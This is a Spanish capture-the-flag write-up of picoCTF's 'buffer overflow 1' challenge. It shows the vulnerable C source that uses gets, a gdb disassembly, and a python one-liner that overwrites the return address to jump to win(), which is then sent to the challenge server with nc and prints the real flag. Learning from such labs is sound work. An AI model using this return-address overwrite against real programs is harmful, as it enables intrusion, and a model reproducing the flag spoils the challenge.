## Description

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 57832`
#### Hints
- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.
## Solución

```shell
┌──(kali㉿kali)-[~/…/categorias/binary_explotation/parte_02/buffer_overflow_1]
└─$ nano flag.txt              
                                                                                                            
┌──(kali㉿kali)-[~/…/categorias/binary_explotation/parte_02/buffer_overflow_1]
└─$ cat flag.txt 
picoCTF{dummie_flag}


┌──(kali㉿kali)-[~/…/categorias/binary_explotation/parte_02/buffer_overflow_1]
└─$ ./vuln       
Please enter your string: 
toromax123jkdlfads
Okay, time to return... Fingers Crossed... Jumping to 0x804932f


┌──(kali㉿kali)-[~/…/categorias/binary_explotation/parte_02/buffer_overflow_1]
└─$ gdb -q vuln                           
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info functions
All defined functions:

*Como se puede observar no está la funcio´n que menciona después de ejecutar el binario*


Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
--Type <RET> for more, q to quit, c to continue without paging--
                                                                   
(gdb) disassemble main
Dump of assembler code for function main:
   0x080492c4 <+0>:     endbr32
   0x080492c8 <+4>:     lea    0x4(%esp),%ecx
   0x080492cc <+8>:     and    $0xfffffff0,%esp
   0x080492cf <+11>:    push   -0x4(%ecx)
   0x080492d2 <+14>:    push   %ebp
   0x080492d3 <+15>:    mov    %esp,%ebp
   0x080492d5 <+17>:    push   %ebx
   0x080492d6 <+18>:    push   %ecx
   0x080492d7 <+19>:    sub    $0x10,%esp
   0x080492da <+22>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492df <+27>:    add    $0x2d21,%ebx
   0x080492e5 <+33>:    mov    -0x4(%ebx),%eax
   0x080492eb <+39>:    mov    (%eax),%eax
   0x080492ed <+41>:    push   $0x0
   0x080492ef <+43>:    push   $0x2
   0x080492f1 <+45>:    push   $0x0
   0x080492f3 <+47>:    push   %eax
   0x080492f4 <+48>:    call   0x80490b0 <setvbuf@plt>
   0x080492f9 <+53>:    add    $0x10,%esp
   0x080492fc <+56>:    call   0x8049070 <getegid@plt>
--Type <RET> for more, q to quit, c to continue without paging--RET
   0x08049301 <+61>:    mov    %eax,-0xc(%ebp)
   0x08049304 <+64>:    sub    $0x4,%esp
   0x08049307 <+67>:    push   -0xc(%ebp)
   0x0804930a <+70>:    push   -0xc(%ebp)
   0x0804930d <+73>:    push   -0xc(%ebp)
   0x08049310 <+76>:    call   0x80490d0 <setresgid@plt>
   0x08049315 <+81>:    add    $0x10,%esp
   0x08049318 <+84>:    sub    $0xc,%esp
   0x0804931b <+87>:    lea    -0x1f60(%ebx),%eax
   0x08049321 <+93>:    push   %eax
   0x08049322 <+94>:    call   0x8049080 <puts@plt>
   0x08049327 <+99>:    add    $0x10,%esp
   0x0804932a <+102>:   call   0x8049281 <vuln>
   ****0x0804932f <+107>:   mov    $0x0,%eax*****
   0x08049334 <+112>:   lea    -0x8(%ebp),%esp
   0x08049337 <+115>:   pop    %ecx
   0x08049338 <+116>:   pop    %ebx
   0x08049339 <+117>:   pop    %ebp
   0x0804933a <+118>:   lea    -0x4(%ecx),%esp
   0x0804933d <+121>:   ret
End of assembler dump.
(gdb) 



┌──(kali㉿kali)-[~/…/categorias/binary_explotation/parte_02/buffer_overflow_1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*48)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*48)" | 
zsh: segmentation fault  ./vuln


┌──(kali㉿kali)-[~/…/categorias/binary_explotation/parte_02/buffer_overflow_1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{dummie_flag}
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | 
zsh: segmentation fault  ./vuln

```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

## Conexión y obtención de la Flag
```shell
┌──(kali㉿kali)-[~/…/categorias/binary_explotation/parte_02/buffer_overflow_1]
└─$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 57418
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e} 
```

## Bandera
```css
flag: picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}
```
## Notas Adicionales

## Referencias
- 